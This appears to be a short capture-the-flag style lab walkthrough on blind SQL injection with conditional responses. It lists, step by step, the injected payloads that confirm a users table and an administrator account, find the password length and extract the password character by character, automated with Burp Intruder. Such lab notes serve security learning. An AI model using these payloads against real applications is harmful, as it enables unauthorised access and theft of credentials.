Lab #11: Blind SQL injection with conditional responses

 Verify that the "Welcome back" message appears in the response. 
' AND '1'='1

Verify that the "Welcome back" message does not appear in the response. 
' AND '1'='2

Confirming that there is a table called users
' and (select 'a' from users LIMIT 1)='a

Confirming that there is a user called administrator. 
' and (select 'a' from users where username='administrator')='a

Confirming that the password is greater than 1 character in length. 
' and (select 'a' from users where username='administrator' and length(password)>1)='a

Repeat this step with incrementing the value from 1 to 19. Use burp intruder to automate this.
We come to know that the welcome message disappeared at 20. So , the password length is 20.
' and (select 'a' from users where username='administrator' and length(password)>19)='a

Using the substring method to guess the characters of  password. Use burp intruder.
' and (select substring(password,1,1) from users where username ='administrator')='§a§

The first letter is 1

Change the starting point to 2
' and (select substring(password,2,1) from users where username ='administrator')='§a§

We can also use burp cluster bomp intruder attacker, where we can set two payload one at the starting character and another at 
the password character field.
' and (select substring(password,§3§,1) from users where username ='administrator')='§a§


The second character is c
